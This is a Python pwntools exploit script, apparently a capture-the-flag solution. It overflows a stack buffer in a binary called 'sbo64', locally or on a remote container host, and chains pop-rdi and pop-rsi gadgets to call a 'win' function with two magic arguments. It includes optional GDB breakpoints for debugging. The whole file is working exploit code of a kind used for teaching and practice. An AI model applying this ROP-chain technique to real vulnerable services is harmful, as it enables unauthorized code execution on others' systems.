# usage: python3 ex.py <local?> <with_gdb?>

import os
import sys
from pwn import *


host = "sbo02.westus2.azurecontainer.io"
port = 8080

POP_RDI = p64(0x401373) # : pop rdi ; ret
POP_RSI = p64(0x401371) # : pop rsi ; pop r15 ; ret

win_offset = p64(0x401216)
win_params = [p64(0x1337c0d3), p64(0xacc01ade)]


buffer1 = ("A"*56).encode()
ex = buffer1 + POP_RDI + win_params[0] + POP_RSI + win_params[1] + ("B"*8).encode() + win_offset

# ------------------------------------------------------------------ #
if len(sys.argv) < 2:
	print("Enter 0 or 1 as params for local (1) or remote (0) exploit.")
	exit(0)

if sys.argv[1] == "1":
	binary = ELF('./sbo64', checksec=False)
	p = binary.process()

	if len(sys.argv) == 3 and sys.argv[2] == "1":

		# break before rets and before cmp
		# check rip at first break
		# check registers before cmp and flags after cmp
		gdb.attach(p, '''
		break *0x004012ff
		break *0x00401371
		break *0x00401260
		continue
		info frame
		continue
		info registers rdi
		info frame
		continue
		info registers rdi
		info registers rsi
		p $eflags
		ni
		p $eflags
		ni
		p $eflags
		''')

	print(p.recv().decode())
	p.sendline(ex)
	print(p.recv().decode())
	print(p.recv().decode())

else:
	r = remote(host, port)
	print(r.recv().decode())
	r.sendline(ex)
	print(r.recv().decode())
